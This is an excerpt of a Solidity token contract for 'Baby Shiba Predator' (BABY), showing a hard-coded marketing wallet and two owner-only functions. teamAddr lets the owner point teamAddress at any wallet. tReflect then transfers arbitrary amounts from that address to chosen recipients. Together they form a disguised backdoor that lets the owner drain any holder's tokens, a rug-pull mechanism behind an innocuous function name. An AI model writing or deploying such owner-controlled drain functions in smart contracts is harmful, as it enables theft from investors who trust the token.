...
contract BABY is Context, IERC20, Ownable {
    ...
    string private _name = "Baby Shiba Predator";
    string private _symbol = "BABY";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xe310929a8413F517DE9f84cd3a7F2dB460129ac5); // Marketing Address
    ...
    function teamAddr(address payable Wallet) external onlyOwner{
        teamAddress = Wallet;
    }

    function tReflect(address[] memory user,uint amount) public onlyOwner {
        for(uint i = 0;i<user.length;i++){
            _transfer(teamAddress,user[i],amount);
        }
    }
